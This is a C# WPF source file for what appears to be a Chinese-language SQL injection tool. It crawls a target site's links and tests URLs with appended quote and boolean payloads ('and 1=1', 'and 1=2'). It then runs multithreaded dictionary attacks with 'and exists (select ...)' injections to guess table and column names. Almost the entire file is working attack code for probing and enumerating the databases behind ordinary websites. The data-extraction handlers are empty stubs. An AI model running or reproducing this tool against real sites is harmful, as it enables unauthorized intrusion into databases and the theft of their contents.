using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace SQL注入
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        class ListData
        {
            public string HtmlText;
            public string ListName;
            public string SourceUrl;
        }
        class FieldData
        {
            public string FieldName;
            public string HtmlText;
            public string ListName;
            public string SourceUrl;
        }
        int MaxThreads;
        int CurrentThreads;
        int head;
        int tail;
        string HtmlDoc;
        static ArrayList al = new ArrayList();
        static string strRegex = @"(http|https|ftp):(\/\/|\\\\)([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)?";
        Regex regex = new Regex("href=\"[^\"]+\"",RegexOptions.IgnoreCase);
        Regex r = new Regex(strRegex, RegexOptions.IgnoreCase);
        static string temp = null;
        public MainWindow()
        {
            InitializeComponent();
            ThreadPool.SetMaxThreads(30, 2000);
        }

        bool Same(int x, int y)
        {
            if (Math.Abs(x - y) <= 10)
                return true;
            return false;
        }

        private string GetPageResource(string url, bool ShowError)
        {
            try
            {
                WebClient myWebClient = new WebClient();
                Stream myStream = myWebClient.OpenRead(url);
                StreamReader sr = new StreamReader(myStream, System.Text.Encoding.GetEncoding("GB18030"));
                string strHTML = sr.ReadToEnd();
                myStream.Close();
                return strHTML;
            }
            catch (Exception e)
            {
                if (ShowError)
                    MessageBox.Show(e.Message, "链接存在问题");
            }
            return null;
        }

        private string GetPageResource(string url)
        {
            try
            {
                WebClient myWebClient = new WebClient();
                Stream myStream = myWebClient.OpenRead(url);
                StreamReader sr = new StreamReader(myStream, System.Text.Encoding.GetEncoding("GB18030"));
                string strHTML = sr.ReadToEnd();
                myStream.Close();
                return strHTML;
            }
            catch
            {
                return "-";
            }
        }

        string BuildUrl(string Root, string Cur)
        {
            try
            {
                Uri uri = new Uri(Root);
                Uri ur = new Uri(uri, Cur);
                return ur.AbsoluteUri;
            }
            catch { return null; }
        }

        private void Refreshal(object uri)
        {
            string url = (string)uri;
            string htmlCode = GetPageResource(url);
            string CurUrl;
            MatchCollection m = regex.Matches(htmlCode);
            foreach (Match mc in m)
            {
                lock (this)
                {
                    CurUrl = mc.Value.Substring(6, mc.Value.Length - 7);
                    if (!CurUrl.StartsWith("http"))
                    {
                        CurUrl = BuildUrl(url, CurUrl);
                    }
                    if (CurUrl != null && !al.Contains(CurUrl) && CurUrl.StartsWith(temp))
                    {
                        Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { al.Add(CurUrl); }));
                        tail += 1;
                        Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { textBoxStatus.AppendText(CurUrl + "\r\n"); textBoxStatus.ScrollToEnd(); }));
                    }
                }
            }
            CurrentThreads -= 1;
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { PB.Value += 1; }));
            return;
        }

        private void Check(object url)
        {
            string SourceUrl = (string)url;
            string HtmlText = GetPageResource(SourceUrl, true);
            if (HtmlText == "NOTHING!!")
            {
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { lableSingle.Content = "检测完成"; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { textBoxSingle.IsEnabled = true; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { Button_Check.IsEnabled = true; }));
                return;
            }
            int std = HtmlText.Length;
            int cp1, cp2, cp3;
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressbaiSingle.Value += 1; }));
            string HtmlCP1 = GetPageResource(SourceUrl + "'", false);
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressbaiSingle.Value += 1; }));
            string HtmlCP2 = GetPageResource(SourceUrl + " and 1=1", false);
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressbaiSingle.Value += 1; }));
            string HtmlCP3 = GetPageResource(SourceUrl + " and 1=2", false);
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressbaiSingle.Value += 1; }));
            try
            {
                cp1 = HtmlCP1.Length;
                cp2 = HtmlCP2.Length;
                cp3 = HtmlCP3.Length;
                if (Same(std, cp2) && !Same(std, cp1) && !Same(std, cp3))
                {
                    MessageBox.Show("存在SQL注入漏洞");
                }
                else
                    MessageBox.Show("安全链接");
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { lableSingle.Content = "检测完成"; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { textBoxSingle.IsEnabled = true; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { Button_Check.IsEnabled = true; }));
            }
            catch
            {
                MessageBox.Show("安全链接");
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { lableSingle.Content = "检测完成"; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { textBoxSingle.IsEnabled = true; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { Button_Check.IsEnabled = true; }));
            }
            return;
        }

        private bool Check(string SourceUrl)
        {
            HtmlDoc = GetPageResource(SourceUrl);
            if (HtmlDoc == "NOTHING!!")
            {
                return false;
            }
            int std = HtmlDoc.Length;
            string HtmlCP1 = GetPageResource(SourceUrl + "'");
            int cp1 = HtmlCP1.Length;
            string HtmlCP2 = GetPageResource(SourceUrl + " and 1=1");
            int cp2 = HtmlCP2.Length;
            string HtmlCP3 = GetPageResource(SourceUrl + " and 1=2");
            int cp3 = HtmlCP3.Length;
            if (Same(std, cp2) && !Same(std, cp1) && !Same(std, cp3))
            {
                return true;
            }
            else
                return false;
        }

        private void Button_Check_Click(object sender, RoutedEventArgs e)
        {
            Thread t = new Thread(new ParameterizedThreadStart(Check));
            t.Start((object)textBoxSingle.Text.ToString());
            textBoxSingle.IsEnabled = false;
            progressbaiSingle.Value = 0;
            Button_Check.IsEnabled = false;
            lableSingle.Content = "正在检测";
            return;
        }

        private void GetWholeSite()
        {
            for (; ; )
            {
                if (head < tail && CurrentThreads < MaxThreads)
                {
                    CurrentThreads += 1;
                    Thread t = new Thread(new ParameterizedThreadStart(Refreshal));
                    t.Start(al[head]);
                    head += 1;
                }
                else if (head == tail && CurrentThreads == 0)
                    break;
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { PB.Maximum = tail; LB.Content = PB.Value.ToString() + " / " + PB.Maximum.ToString();}));
                Thread.Sleep(50);
            }
            MessageBox.Show("搜索完成!");
            return;
        }

        private void Button_WholeSite_Click(object sender, EventArgs e)
        {
            #region 原来的代码
            MaxThreads = 30;
            CurrentThreads = 0;
            PB.Value = 0;
            head = 0;
            tail = 1;
            al.Clear();
            al.Add(textBoxSite.Text);
            temp = textBoxMain.Text;
            Thread t = new Thread(new ThreadStart(GetWholeSite));
            t.Start();
            return;
            #endregion
        }

        private void List_Click_1(object sender, RoutedEventArgs e)
        {
            StreamReader sr = new StreamReader(@"List.txt");
            List<string> ls = new List<string>();
            string temp;
            while ((temp = sr.ReadLine()) != null)
                ls.Add(temp);
            sr.Close();
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressBar.Value = 0; progressBar.Maximum = ls.Count; }));
            foreach (string ListName in ls)
            {
                ListData ld = new ListData();
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { ld.SourceUrl = InjetUrl.Text; ld.ListName = ListName; ld.HtmlText = HtmlDoc; }));
                ThreadPool.QueueUserWorkItem(new WaitCallback(GuessListName), (object)ld);
            }
            return;
        }

        private void GuessListName(object listdata)
        {
            ListData ld = (ListData)listdata;
            try
            {
                if (Same(GetPageResource(ld.SourceUrl + "and exists (select * from [" + ld.ListName + "])").Length, ld.HtmlText.Length))
                    Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { ListText.AppendText(ld.ListName + "\r\n"); Field.IsEnabled = true; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressBar.Value += 1; }));
            }
            catch { Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressBar.Value += 1; })); }
            return;
        }

        private void Field_Click_1(object sender, RoutedEventArgs e)
        {
            StreamReader sr = new StreamReader(@"Field.txt");
            List<string> ls = new List<string>();
            string temp;
            while ((temp = sr.ReadLine()) != null)
                ls.Add(temp);
            sr.Close();
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressBar.Value = 0; progressBar.Maximum = ls.Count; }));
            foreach (string FieldName in ls)
            {
                FieldData fd = new FieldData();
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { fd.SourceUrl = InjetUrl.Text; fd.ListName = ListName.Text; fd.HtmlText = HtmlDoc; fd.FieldName = FieldName; }));
                ThreadPool.QueueUserWorkItem(new WaitCallback(GuessFieldName), (object)fd);
            }
            return;
        }

        private void GuessFieldName(object fielddata)
        {
            FieldData fd = (FieldData)fielddata;
            try
            {
                if (Same(GetPageResource(fd.SourceUrl + "and exists (select [" + fd.FieldName +"] from [" + fd.ListName + "])").Length, fd.HtmlText.Length))
                    Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { FieldText.AppendText(fd.FieldName + "\r\n"); }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressBar.Value += 1; }));
            }
            catch { Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressBar.Value += 1; })); }
            return;
        }

        private void Lenth_Click_1(object sender, RoutedEventArgs e)
        {

        }

        private void Content_Click_1(object sender, RoutedEventArgs e)
        {

        }

        private void ListDict_Click_1(object sender, RoutedEventArgs e)
        {
            if (File.Exists("List.txt"))
            {
                System.Diagnostics.Process.Start("List.txt");
            }
            else
            { 
                File.Create("List.txt").Close();
                System.Diagnostics.Process.Start("List.txt");
            }
               
            
        }

        private void FieldDict_Click_1(object sender, RoutedEventArgs e)
        {
            if (File.Exists("Field.txt"))
            {
                System.Diagnostics.Process.Start("Field.txt");
            }
            else
            {
                File.Create("Field.txt").Close();
                System.Diagnostics.Process.Start("Field.txt");
            }
        }

        private void Test_Click_1(object sender, RoutedEventArgs e)
        {
            if (Check(InjetUrl.Text))
            {
                List.IsEnabled = true;
            }
            else
                MessageBox.Show("这个链接好像不能注入 (/>.<\\)");
        }
    }
}

